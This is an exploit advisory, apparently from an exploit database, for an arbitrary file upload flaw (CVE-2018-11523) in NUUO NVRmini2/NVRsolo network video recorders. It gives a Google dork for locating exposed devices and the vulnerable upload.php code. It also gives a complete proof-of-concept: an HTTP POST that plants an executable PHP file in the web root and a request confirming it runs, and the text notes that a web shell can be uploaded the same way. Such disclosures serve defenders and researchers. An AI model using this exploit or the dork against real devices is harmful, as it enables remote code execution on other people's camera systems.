@@ -1,0 +1,75 @@
+# Exploit Title: NUUO NVRmini2 / NVRsolo Arbitrary File Upload Vulnerability
+# Google Dork: intitle:NUUO Network Video Recorder Login
+# Date: 2018-05-20
+# Exploit Author: M3@Pandas
+# Vendor Homepage: http://www.nuuo.com
+# Software Link: N/A
+# Version: all
+# Tested on: PHP Linux
+# CVE : CVE-2018-11523
+
+==========================
+Advisory: NUUO NVRmini2 / NVRsolo Arbitrary File Upload Vulnerability
+Author: M3@pandas From DBAppSecurity
+Affected Version: All
+==========================
+Vulnerability Description
+==========================
+
+
+Recetly, I found an Arbitrary File Upload Vulnerability in 'NUUO NVRmini2' program, NVRmini2 is widely used all over 
+the world.
+
+
+Vulnerable cgi: /upload.php
+
+
+<?php
+//echo $_FILES['userfile']['type'];
+//echo ":";
+//echo $_FILES['userfile']['size'];
+//echo ":";
+//echo urldecode($_FILES['userfile']['name']);
+//echo ":";
+//echo $_FILES['userfile']['tmp_name'];
+//echo ":";
+//echo $_FILES['userfile']['error'];
+//echo ":";
+echo $_FILES['userfile']['name'];
+copy($_FILES["userfile"]["tmp_name"],$_FILES['userfile']['name']);
+?>
+
+
+
+
+As the code above, no any filter, so we can upload a php shell directly to the web server.
+
+
+==========================
+POC  EXP
+==========================
+
+
+1. Upload 'nuuonvr.php' to web root path:
+
+POST /upload.php HTTP/1.1
+Host: 192.168.10.1
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: multipart/form-data; boundary=--------969849961
+Content-Length: 162
+
+----------969849961
+Content-Disposition: form-data; name="userfile"; filename="nuuonvr.php"
+
+?php phpinfo();@unlink(__FILE__);?
+----------969849961--
+
+
+2. Check if the php file is uploaded successfully:
+	GET http://192.168.10.1/nuuonvr.php
+
+ If the page returns phpinfo info, target is vulnerable!
